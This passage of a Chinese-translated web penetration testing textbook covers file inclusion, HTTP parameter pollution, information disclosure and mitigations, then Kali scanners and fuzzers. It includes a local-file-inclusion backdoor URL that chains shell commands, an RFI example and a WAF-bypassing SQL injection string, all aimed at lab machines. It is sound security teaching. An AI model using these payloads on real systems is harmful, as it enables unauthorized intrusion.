![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00269.jpeg)

您还可以使用`;`（分号）作为分隔符，在单个调用中链接多个命令：

```
http://10.7.7.5/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/simple-backdoor.php&cmd=uname+-a;whoami;/sbin/ifconfig
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00270.jpeg)

# 远程文件包含

**远程文件包含**（**RFI**）是一种攻击技术，利用应用程序允许从其他服务器包含文件的机制。这可能导致应用程序被欺骗以在攻击者控制的远程服务器上运行脚本。

RFI 的工作方式与 LFI 完全相同，唯一的区别是使用完整的 URL 而不是文件的相对路径，如下所示：

```
http://vulnerable_website.com/preview.php?script=http://example.com/temp  
```

现代 Web 服务器默认禁用包括文件（尤其是外部文件）的功能。然而，有时应用程序或业务的要求会使开发人员启用此功能。随着时间的推移，这种情况发生的频率越来越少。

# HTTP 参数污染

HTTP 允许在`GET`和`POST`方法中使用相同名称的多个参数。HTTP 标准既不解释也没有规定如何解释具有相同名称的多个输入参数 - 是接受变量的最后出现还是第一次出现，或者将变量用作数组。

例如，以下`POST`请求符合标准，即使`item_id`变量的值为`num1`和`num2`：

```
item_id=num1&second_parameter=3&item_id=num2  
```

尽管根据 HTTP 协议标准，不同的 Web 服务器和开发框架处理多个参数的方式各不相同。处理多个参数的未知过程经常导致安全问题。这种意外行为被称为**HTTP 参数污染**。下表显示了主要 Web 服务器中的 HTTP 重复参数行为：

| **框架/ Web 服务器** | **结果动作** | **示例** |
| --- | --- | --- |
| ASP.NET/IIS | 所有出现的参数用逗号连接 | `item_id=num1,num2` |
| PHP/Apache | 最后出现 | `item_id=num2` |
| JSP/Tomcat | 第一次出现 | `item_id=num1` |
| IBM HTTP 服务器 | 第一次出现 | `item_id=num1` |
| Python | 所有出现的参数组合成一个列表（数组） | `item_id=['num1','num2']` |
| Perl/Apache | 第一次出现 | `item_id=num1` |

想象一种情况，Tomcat 服务器位于基于 Apache 和 PHP 的**Web 应用程序防火墙**（**WAF**）后面，攻击者在请求中发送以下参数列表：

```
item_id=num1'+or+'1'='1&second_parameter=3&item_id=num2  
```

WAF 将采用参数的最后出现并确定它是一个合法的值，而 Web 服务器将采用第一个出现的值，如果应用程序容易受到 SQL 注入攻击，攻击将成功，绕过 WAF 提供的保护。

# 信息泄露

使用 Web 应用程序的目的是允许用户访问信息并执行任务。然而，并不是每个用户都应该能够访问所有数据，并且有关应用程序、操作系统和用户的一些信息，攻击者可以利用这些信息来获取知识并最终访问应用程序的经过身份验证的功能。

为了使用户与应用程序的交互更友好，开发人员有时可能会发布过多的信息。此外，在它们的默认安装中，Web 开发框架被预配置为显示和突出显示它们的功能，而不是为了安全。这就是为什么很多时候这些默认配置选项会一直保持活动状态，直到框架的正式发布，从而暴露可能构成安全风险的信息和功能。

让我们来看一些可能带来安全风险的信息泄露示例。在下面的截图中，您可以看到一个名为`phpinfo.php`的页面。这个页面有时会默认安装在 Apache/PHP 服务器上，它提供了关于底层操作系统、Web 服务器的活动模块和配置以及更多详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00271.jpeg)

您还会发现客户端源代码中使用了描述性注释的情况。以下是一个极端的例子。在现实世界的应用程序中，您可能能够找到有关应用程序逻辑和功能的详细信息，这些信息仅仅被注释掉了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00272.jpeg)

在下一个截图中，您可以看到 Web 应用程序中一个相当常见的问题。这个问题经常被开发人员、安全人员和风险分析师低估。它涉及一个过于冗长的错误消息，显示了调试跟踪、错误的文件名和行号等等。这可能足以让攻击者识别操作系统、Web 服务器版本、开发框架、数据库版本和文件结构，并获取更多信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00273.jpeg)

在最后一个示例中，身份验证令牌存储在 HTML5 会话存储中。请记住，通过 JavaScript 可以访问此对象，这意味着如果存在 XSS 漏洞，攻击者将能够劫持用户的会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00274.jpeg)

# 缓解措施

现在我们将讨论如何预防或缓解前面部分中解释的漏洞。简而言之，我们将执行以下操作：

+   遵循最小特权原则

+   验证所有输入

+   检查/加固服务器配置

# 不安全的直接对象引用

始终优先使用间接引用。使用非连续的数字标识符引用允许的对象表，而不是允许用户直接使用对象的名称。

对从浏览器接收到的数据进行适当的输入验证和清理将防止路径遍历攻击。应用程序的开发人员在进行文件系统调用时应注意接受用户输入。如果可能，应避免这样做。**chroot 监狱**涉及将应用程序的根目录与操作系统的其余部分隔离开来，这是一种很好的缓解技术，但可能难以实现。

对于其他类型的直接对象引用，必须遵循最小特权原则。用户只能访问他们正常操作所需的信息，并且必须对用户发出的每个请求进行授权验证。当请求任何其配置文件或角色不应查看或访问的信息时，他们应收到错误消息或*未经授权*的响应。

WAFs 也可以阻止此类攻击，但它们应与其他缓解技术一起使用。

# 文件包含攻击

在设计层面上，应用程序应尽量减少用户输入对应用程序流程的影响。如果应用程序依赖用户输入进行文件包含，应选择间接引用而不是直接引用。例如，客户端提交一个对象 ID，然后在包含有效文件列表的服务器端目录中搜索该 ID。应进行代码审查以查找包含文件的函数，并进行检查以分析是否对从用户接收到的数据进行适当的输入验证以对数据进行清理。

# HTTP 参数污染

在这种漏洞中，应用程序未执行适当的输入验证，导致覆盖硬编码的值。白名单预期参数及其值应包含在应用程序逻辑中，并对用户输入进行清理。应使用能够跟踪变量的多个出现并已调整以理解该缺陷的 WAF 来处理过滤。

# 信息泄露

在发布到生产环境之前，必须彻底审查服务器配置。应删除任何不是应用程序功能所必需的多余文件或文件，以及可能泄露相关信息的所有服务器响应头，例如以下内容：

+   `服务器`

+   `X-Powered-By`

+   `X-AspNet-Version`

+   `版本`

# 总结

在本章中，我们回顾了一些可能逃避 XSS、SQL 注入和其他常见漏洞的 Web 应用程序中的漏洞。作为渗透测试人员，您需要知道如何识别、利用和缓解漏洞，以便能够找出它们并为客户提供适当的建议。

我们开始本章时介绍了不安全的直接对象引用的广义概念及其一些变体。然后我们转向文件包含漏洞，它是一种特殊类型的不安全的直接对象引用，但它本身代表了一个分类类别。我们对 LFI 进行了练习，并解释了远程版本。

之后，我们回顾了不同服务器如何处理请求中的重复参数，以及攻击者如何通过 HTTP 参数污染利用这一点。

接下来，我们研究了信息披露，并回顾了提供的示例，说明应用程序如何向用户呈现过多的信息，以及恶意代理如何利用这些信息来收集信息或进一步为攻击做准备。

最后，我们还介绍了一些对前面漏洞的缓解建议。大部分缓解技术依赖于服务器的正确配置和应用程序代码的严格输入验证。

到目前为止，我们一直在手动进行所有的测试和利用，这是进行安全测试和学习的最佳方式。然而，有些情况下我们需要在短时间内覆盖大范围，或者客户要求使用一些扫描工具，或者我们只是不想错过任何低风险的漏洞；在下一章中，我们将学习 Kali Linux 中包含的自动化漏洞扫描器和模糊测试工具，这些工具将帮助我们应对这些情况。


# 第十一章：在 Web 应用程序上使用自动化扫描器

到目前为止，您已经学习了如何通过逐个测试参数或请求来查找和利用 Web 应用程序中的漏洞。尽管这是发现安全漏洞的最佳方法，特别是与应用程序内部信息流相关的漏洞或与业务逻辑和授权控制相关的漏洞，但在专业渗透测试中，有些项目由于时间、范围或数量的原因无法通过手动测试完全解决，需要使用帮助加速发现漏洞过程的自动化工具。

在本章中，我们将讨论在 Web 应用程序上使用自动化漏洞扫描器时需要考虑的方面。您还将了解 Kali Linux 中包含的扫描器和模糊测试工具以及如何使用它们。

# 在使用自动化扫描工具之前的考虑事项

Web 应用程序漏洞扫描器的操作方式与其他类型的扫描器（如 OpenVAS 或 Nessus）略有不同。后者通常连接到主机上的端口，获取运行在这些端口上的服务的类型和版本，然后将此信息与其漏洞数据库进行比对。相反，Web 应用程序扫描器会识别应用程序页面中的输入参数，并在每个参数上提交大量请求，探测不同的有效负载。

由于以这种方式操作，自动化扫描几乎肯定会在数据库中记录信息，生成活动日志，修改现有信息，并且如果应用程序具有删除或恢复功能，甚至可能擦除数据库。

以下是渗透测试人员在将 Web 漏洞扫描器作为测试手段之前必须考虑的关键因素：

+   检查范围和项目文档，确保允许使用自动化工具。

+   在专门为此目的设置的环境中进行测试（QA、开发或测试）。仅在客户明确要求的情况下使用生产环境，并让他们知道存在损坏数据的固有风险。

+   更新工具的插件和模块，以使结果与最新的漏洞披露和技术保持同步。

+   在启动扫描之前检查扫描工具的参数和范围。

+   将工具配置到最高级别的日志记录。日志将在任何事件发生时非常有用，以及用于验证结果和报告。

+   不要让扫描器无人看管。您不需要盯着进度条，但应不断检查扫描器的运行情况和被测试服务器的状态。

+   不要依赖单一工具-有时不同的工具会对相同类型的测试产生不同的结果。当一个工具错过了一些漏洞时，另一个工具可能会找到它，但会错过其他东西。因此，如果您在测试范围内使用自动化扫描工具，请使用多个工具，并考虑使用商业产品，如 Burp Suite Professional 或 Acunetix。

# Kali Linux 中的 Web 应用漏洞扫描器

Kali Linux 包括多个用于自动化扫描 Web 应用程序漏洞的工具。我们已经检查了其中一些，特别是那些专注于特定漏洞的工具，如用于 SQL 注入的 sqlmap 或用于跨站脚本（XSS）的 XSSer。

接下来，我们将介绍这里列出的一些更通用的 Web 漏洞扫描器的基本用法：

+   Nikto

+   Skipfish

+   Wapiti

+   OWASP-ZAP

# Nikto

长期以来的经典之作，**Nikto**可能是世界上使用最广泛、最知名的网络漏洞扫描器。尽管它的扫描操作不是很深入，其发现结果有些通用（主要与过时的软件版本、使用的易受攻击的组件或通过分析响应头检测到的配置错误有关），但 Nikto 仍然是一个非常有用的工具，因为它拥有广泛的测试集和低破坏性的特点。

Nikto 是一个命令行工具。在下面的截图中，使用`nikto`命令和参数`-h`指定要扫描的主机或 URL，`-o`指定输出文件。文件的扩展名确定报告的格式。其他常见的格式有`.csv`（逗号分隔文件）和`.txt`（文本文件）：

有关使用`nikto`的更多详细信息和其他选项，请使用`-H`选项运行它以获取完整的帮助。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00275.jpeg)

现在让我们看看上次扫描的报告是什么样子的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00276.jpeg)

根据这两个屏幕截图，您可以看到 Nikto 识别出了服务器版本和响应头中的一些问题。特别是，一个 IP 地址泄露了一些保护头的缺失，比如`X-Frame-Options`和`X-XSS-Protection`，以及会话 cookie 不包含`HttpOnly`标志。这意味着它可以通过脚本代码检索到。

# Skipfish

**Skipfish**是一个非常快速的扫描器，可以帮助识别以下漏洞：

+   跨站脚本攻击

+   SQL 注入

+   命令注入

+   XML/XPath 注入

+   目录遍历和文件包含

+   目录列表

根据其 Google *Code*页面（[`code.google.com/p/skipfish/`](http://code.google.com/p/skipfish/)）：

Skipfish 是一款主动的网络应用安全侦察工具。它通过递归爬行和基于字典的探测来为目标站点准备一个交互式站点地图。然后，该地图会被一些主动的（但希望不会造成破坏的）安全检查的输出进行注释。该工具生成的最终报告旨在作为专业网络应用安全评估的基础。

使用 Skipfish 非常简单。您只需要提供要扫描的 URL 作为参数。可选地，您可以添加输出文件并对扫描进行微调。要在测试虚拟机中运行 Skipfish 并生成 HTML 报告，请使用以下命令：

```
skipfish -o WebPentest/skipfish_result -I WackoPicko http://10.7.7.5/WackoPicko/  
```

`-o`选项指示报告存储的目录。`-I`选项告诉 Skipfish 只扫描包含字符串`WackoPicko`的 URL，排除虚拟机中的其他应用程序。最后一个参数是您希望扫描开始的 URL。

当启动命令时，会出现一个信息屏幕。您可以按任意键或等待 60 秒开始扫描。一旦扫描开始，将显示以下状态屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00277.jpeg)

当扫描完成时，会显示如下的摘要屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00278.jpeg)

此外，一旦扫描完成，报告将准备好在指定的文件夹中。以下截图显示了 Skipfish 报告的样子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00279.jpeg)

报告显示了 Skipfish 在高风险（红点）到低风险（橙点）的顺序中识别出的漏洞。例如，Skipfish 在登录页面中识别出了一个 SQL 注入漏洞，查询注入向量，被扫描器评为高风险。它还识别出了一个目录遍历或文件包含和一个可能的 XSS 漏洞，被评为中风险，等等。

# Wapiti

**Wapiti**是一个活跃维护的基于命令行的网络漏洞扫描工具。Wapiti 3.0 版本于 2018 年 1 月发布（[`wapiti.sourceforge.net/`](http://wapiti.sourceforge.net/)）；然而，Kali Linux 仍然包含先前版本（2.3.0）。根据 Wapiti 网站的介绍，该工具包括检测以下漏洞的模块：

+   文件泄露（本地和远程包含/引用，`fopen`，`readfile`...）

+   数据库注入（PHP/JSP/ASP SQL 注入和 XPath 注入）

+   XSS（跨站脚本）注入（反射和永久）

+   命令执行检测（`eval()`，`system()`，`passtru()`...）

+   CRLF 注入（HTTP 响应拆分，会话固定...）

+   XXE（XML 外部实体）注入

+   使用已知的潜在危险文件（感谢 Nikto 数据库）

+   可以绕过的弱`.htaccess`配置

+   存在备份文件，提供敏感信息（源代码泄露）

+   Shellshock（又名 Bash 漏洞）

要启动 Wapiti，您需要在命令行中输入`launch`命令，然后输入要扫描的 URL 和选项。

在下面的屏幕截图中，Wapiti 在易受攻击的虚拟机上通过 HTTPS 站点运行，生成报告存储在`wapiti_output`目录中（使用`-o`选项）。您可以跳过 SSL 证书验证，因为测试虚拟机具有自签名证书。如果不进行此类验证，Wapiti 将停止扫描，因此使用`--verify-ssl 0`来绕过验证。您不应发送超过 50 个相同请求的变体（使用`-n`选项）。这样做是为了防止循环。最后，使用`2> null`来防止标准错误输出过多，因为扫描器将发送多个具有非预期值的请求，而 Wapiti 可能会非常冗长：

```
wapiti https://10.7.7.5/bodgeit/ -o wapiti_output --verify-ssl 0 -n 20 2>null 
```

然后您将在屏幕上看到以下输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00280.jpeg)

扫描需要一些时间。完成后，打开指定目录中的`index.html`文件以查看结果。以下是 Wapiti 报告漏洞的示例：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00281.jpeg)

Wapiti 的报告非常详细，包括每个发现的描述，用于触发潜在漏洞的请求，建议的解决方案以及获取有关这些信息的参考资料。在前面的屏幕截图中，您可以看到它在 BodgeIt 的搜索页面中发现了 XSS 漏洞。

# OWASP-ZAP 扫描器

在 OWASP-ZAP 的众多功能中，有一个主动漏洞扫描器。在这种情况下，“主动”意味着扫描器会主动向服务器发送精心设计的请求，而不是被动扫描器，后者仅通过代理分析 Web 服务器发送的请求和响应，而正常浏览应用程序。

要使用扫描器，您需要右键单击要扫描的站点或目录，然后选择攻击 | 主动扫描...：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00282.jpeg)

主动扫描器不会对所选目标进行任何爬行或蜘蛛行为。因此，建议您在设置代理的同时手动浏览目标站点，或在扫描目录或主机之前运行蜘蛛。

在主动扫描对话框中，您可以选择目标，是否要进行递归扫描，以及如果启用高级选项，可以选择扫描策略、攻击向量、目标技术和其他选项：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00283.jpeg)

单击“开始扫描”后，主动扫描选项卡将获得焦点，并且扫描进度和请求日志将显示在其中：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00284.jpeg)

扫描结果将记录在警报选项卡中：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00285.jpeg)

此外，使用主菜单中的报告，您可以将结果导出为 HTML、XML、Markdown 或 JSON 等多种格式。以下屏幕截图显示了 HTML 报告的外观：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00286.jpeg)

OWASP-ZAP 还按风险级别对其扫描结果进行排序，并包括对发现的问题的详细描述、使用的有效负载、解决方案建议和参考资料。

Burp Suite 在其专业版中也有一个主动扫描器，可以提供非常准确的结果，并且误报率很低。

# 内容管理系统扫描器

**内容管理系统**（**CMS**），如 WordPress、Joomla 或 Drupal，是用于创建网站的框架，几乎不需要编程。它们集成了第三方插件，以简化诸如登录和会话管理、搜索甚至包括完整购物车模块等任务。

因此，CMS 不仅在其自身的代码中容易受到攻击，而且在其包含的插件中也容易受到攻击。后者不受一致的质量控制，并且通常由独立程序员在业余时间制作，根据自己的时间表发布更新和补丁。

因此，我们现在将介绍一些最受欢迎的 CMS 漏洞扫描工具。

# WPScan

**WPScan**正如其名称所示，是一个专注于 WordPress CMS 的漏洞扫描工具。它将识别 WordPress 的版本号和已安装插件的版本号，然后将它们与已知漏洞的数据库进行匹配，以确定可能的安全风险。

下图显示了 WPScan 的基本用法，只需将目标 URL 作为参数添加即可：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00287.jpeg)

首次运行时，您可能需要使用`--update`选项更新数据库。

# JoomScan

**JoomScan**是包含在 Kali Linux 中的用于 Joomla 网站的漏洞扫描工具。要使用它，只需添加`-u`选项，后跟站点的 URL，如下所示：

```
joomscan -u http://10.7.7.5/joomla  
```

JoomScan 首先尝试通过检测 Joomla 版本和插件来识别服务器，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00288.jpeg)

之后，JoomScan 将显示与检测到的配置或已安装插件相关的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00289.jpeg)

# CMSmap

**CMSmap**未包含在 Kali Linux 中，但可以从其 Git 存储库轻松安装，如下所示：

```
git clone https://github.com/Dionach/CMSmap.git 
```

CMSmap 用于扫描 WordPress、Joomla 或 Drupal 网站的漏洞。它具有自动检测站点使用的 CMS 的能力。它是一个命令行工具，您需要使用`-t`选项指定目标站点。CMSmap 显示它找到的漏洞，并在前面加上一个指示严重程度的标识：`[I]`表示信息，`[L]`表示低，`[M]`表示中，`[H]`表示高，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00290.jpeg)

在截图中使用的`--noedb`选项可以防止 WordPress 在 Exploit Database（[`www.exploit-db.com/`](https://www.exploit-db.com/)）中寻找已识别漏洞的利用程序，因为我们的 Kali Linux 虚拟机未连接到互联网。尝试连接到外部服务器将导致错误和获取结果的延迟。

# 模糊测试 Web 应用程序

**模糊测试**是一种测试机制，通过常规输入将特制的（或随机的，取决于模糊测试的类型）数据发送到软件实现中。实现可以是 Web 应用程序、厚客户端或运行在服务器上的进程。它是一种黑盒测试技术，以自动化方式注入数据。尽管模糊测试主要用于安全测试，但也可用于功能测试。

从前面的定义中，人们可能认为模糊测试与任何漏洞扫描是相同的。是的，模糊测试是漏洞扫描过程的一部分，还可以涉及指纹识别和 Web 应用程序的爬行以及响应分析，以确定是否存在漏洞。

有时，我们需要将模糊测试从扫描过程中分离出来，单独执行，这样我们就可以决定测试输入并分析测试结果，而不是由扫描器来决定。这样，我们可以更好地控制将哪些参数中的测试值发送到服务器。

# 使用 OWASP-ZAP 模糊器

**OWASP-ZAP 模糊器**可以从站点地图、代理历史或请求面板中运行，只需右键单击要模糊的请求，然后选择 Attack | Fuzz...，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00291.jpeg)

在执行此操作后，模糊测试对话框将出现，您可以在其中选择插入点；也就是说，您想要尝试不同值以分析服务器响应的请求的部分。在下面的示例中，我们选择了 OWASP BWA 易受攻击的虚拟机中 BodgeIt 的搜索中的`q`参数的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00292.jpeg)

请注意，已经添加了两个有效负载列表。要做到这一点，选择要模糊测试的文本，本例中为`q`的值，并单击右侧的"添加..."（在模糊测试位置选项卡中）以显示有效负载对话框。然后在该对话框中单击"添加..."。您将从文件`/usr/share/wfuzz/wordlist/injections/SQL.txt`中获取第一个有效负载列表。

该文件包含将帮助识别 SQL 注入漏洞的模糊测试字符串。在有效负载类型中选择文件，单击"选择..."，然后浏览到要加载的文件，如下面的截图所示。然后单击"添加"将该列表添加到模糊测试器中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00293.jpeg)

接下来，使用第二个有效负载来测试 XSS。这次您将使用文件模糊测试器作为类型。这是 OWASP-ZAP 默认包含的一组模糊测试字符串。从这些模糊测试器中，从 JbroFuzz | XSS 中选择一些 XSS 列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00294.jpeg)

OWASP-ZAP 中可用于模糊测试字符串的其他选项如下：

+   **空/空值**：此选项提交原始值（无更改）

+   **数字**：此选项生成一系列数字，允许您定义起始值、结束值和增量

+   **正则表达式**：此选项生成与给定正则表达式匹配的一定数量的字符串

+   **脚本**：此选项允许您使用脚本（从"工具" | "选项..." | "脚本"加载）生成有效负载

+   **字符串**：此选项显示手动提供的简单字符串列表

一旦选择了所有插入点及其相应的模糊测试输入，您可以通过点击"开始模糊测试"来启动模糊测试器。然后，模糊测试器选项卡将显示在底部面板中。

在下一个截图中，您可以看到模糊测试的结果。状态列显示了工具进行的初步诊断，指示此类请求导致可利用的漏洞的可能性有多大。请注意示例中的单词"Reflected"。这意味着模糊测试器发送的字符串已作为响应的一部分由服务器返回。我们知道这是 XSS 的字符串指示器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00295.jpeg)

为了进一步探索在模糊测试器选项卡中显示的结果中是否存在可利用的漏洞，您可以选择任何请求及其头部和正文。相应的响应将显示在中央面板中的相关部分。响应将突出显示*可疑*字符串。这样，您可以一眼看出是否存在漏洞，以及该特定测试用例是否值得进一步挖掘。如果是这种情况，您可以右键单击请求并选择"使用请求编辑器打开/重新发送"来启动请求编辑器并操作和重新发送请求。

进一步调查您认为可能导致利用的请求的另一个选项是在浏览器中重放该请求，以便您可以查看其行为和服务器的响应。要做到这一点，右键单击请求，选择"在浏览器中打开 URL"，然后选择您首选的浏览器。这将打开浏览器并使其提交所选的请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00296.jpeg)

# Burp Intruder

您已经在前几章中使用了 Intruder 进行各种任务，并且您已经意识到它的强大和灵活性。现在我们将使用它来对 BodgeIt 登录页面进行模糊测试，以寻找 SQL 注入漏洞。您需要做的第一件事是将有效的登录请求从代理历史发送到 Intruder。这可以通过右键单击请求并选择"发送到 Intruder"来完成。

进入 Intruder 后，你将清除所有插入点，并在用户名值中添加一个插入点，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00297.jpeg)

下一步是设置负载。为此，转到负载选项卡，点击“加载...”加载一个文件，并转到`/usr/share/wfuzz/wordlist/injections/SQL.txt`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00298.jpeg)

接下来，为了更容易识别有趣的请求，你将添加一些匹配规则，这样你就可以从攻击对话框中判断一个请求是否导致错误或包含有趣的词语。在选项中的 Grep - Match 部分添加以下术语：

+   `error`：当你想知道输入触发错误时，添加这个将很有用，因为基本的 SQL 注入在修改查询语法时会显示错误消息

+   `SQL`：如果错误消息不包含单词`error`，你希望在输入触发包含单词`SQL`的响应时得到通知

+   `table`：当你期望读取包含表名的 SQL 详细错误消息时添加

+   `select`：在有 SQL 语句泄露的情况下添加这个

上述术语列表绝不是用于响应匹配的最佳列表。它仅供演示目的。在实际情况中，人们会首先手动分析应用程序给出的实际响应，然后选择与上下文和所寻找的漏洞相匹配的术语。下面的截图显示了示例匹配列表的样子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00299.jpeg)

一旦所有攻击参数都配置好了，你就可以开始攻击了。`error`很快就开始匹配了。你可以看到每个响应都匹配了`table`，所以这不是一个好选择。至少在最初的响应中，`SQL`和`select`没有匹配。如果你选择一个已经勾选了`error`的响应，你会看到页面顶部有一个“系统错误”的消息，这似乎是在负载包含单引号时触发的。

这可能是 SQL 注入的一个指标，值得进一步挖掘一下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00300.jpeg)

为了查看如果从浏览器中执行此请求，它会在 Burp Suite 的任何组件的每个请求或响应中的行为，你可以右键单击并选择“在浏览器中请求”。你可以选择是否要使用原始会话（发送请求的会话 cookie）或当前会话（浏览器当前拥有的会话 cookie）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00301.jpeg)

当你将请求从 Burp Suite 发送到浏览器时，你会得到一个以`http://burp/repeat/`开头的 URL，你需要将其复制并粘贴到要重放请求的浏览器中。Burp Suite 不像 ZAP 那样启动浏览器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00302.jpeg)

下面的截图显示了示例中的请求在浏览器中的显示方式。它明显看起来不应该有“系统错误”的消息，你应该深入研究该请求，并手动尝试变体以获得 SQL 注入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00303.jpeg)

# 扫描后的操作

遗憾的是，提供渗透测试服务的公司往往只进行漏洞扫描，并在没有手动测试阶段的情况下定制和调整报告，而且没有验证扫描器发现的所谓漏洞是否真的存在。这不仅无法为客户提供任何价值，他们自己可以下载一个漏洞扫描器并对其应用程序进行扫描，而且还会损害公司对安全服务和安全公司的认知，使那些提供优质服务的人更难以以竞争性价格在市场上定位这些服务。

在扫描器生成扫描报告之后，您不能仅凭报告就说您发现了*X*和*Y*漏洞。因为扫描器总是会产生误报（即报告不存在的漏洞）和误报（例如扫描器错过的漏洞），所以您还必须进行手动测试，以便找到并报告自动化工具未覆盖的漏洞，例如授权问题、业务逻辑绕过或滥用等，以便验证扫描器报告的所有发现是否真正是漏洞。

# 总结

在本章中，我们讨论了在 Web 应用程序渗透测试中使用自动化漏洞扫描器的风险，以及在使用这些工具之前需要考虑的问题。

接下来，我们介绍了 Kali Linux 中包含的一些扫描器的使用，如 Nikto、Skipfish、Wapiti 和 OWASP-ZAP。我们还讨论了针对内容管理系统（如 WordPress、Joomla 和 Drupal）的专用扫描器。我们将模糊测试作为一种与扫描不同的技术进行了讨论。我们使用了 OWASP-ZAP 模糊测试器和 Burp Intruder 来测试单个输入上的多个输入。

最后，我们讨论了在自动化扫描或模糊测试完成后需要完成的一些任务。您需要验证扫描器的结果，以消除所有误报，并且需要手动测试应用程序，因为自动化扫描器无法找到某些漏洞。

通过本章，我们结束了本书。渗透测试是一个永远学习的领域。渗透测试人员需要跟上技术的步伐，尽管方法论在变化，但不应忘记旧的方法，因为如今的组织往往会使用过时的框架与先进的技术共存。

本书提供了对 Web 渗透测试的概述，方法论和技术的一般概述，以帮助您识别，利用和纠正 Web 应用程序中最常见的漏洞。您需要通过从不同的来源学习更多知识，进行研究，实践，然后再进行更多的实践来继续您的学习之旅。此外，了解其他领域，如开发，网络和操作系统，也是有利的，因为它可以让您将应用程序与其环境联系起来，并更好地评估其真正带来的风险。

除了本书提到的有价值的应用程序和其他可用的类似应用程序之外，公开的漏洞赏金计划，如 HackerOne（[`www.hackerone.com/`](https://www.hackerone.com/)）和 BugCrowd（[`www.bugcrowd.com/`](https://www.bugcrowd.com/)），是一个非常好的方式，让经验不足的测试人员通过测试真实应用程序来积累经验，并获得报酬。

我希望您，亲爱的读者，发现本书有趣且对您的目的有用，无论是为了了解 Web 应用程序安全以改进您的开发过程，还是为了追求渗透测试职业，或者作为一名经验丰富的渗透测试人员，以提高您的技能并扩展您的测试工具库。感谢您阅读本书。
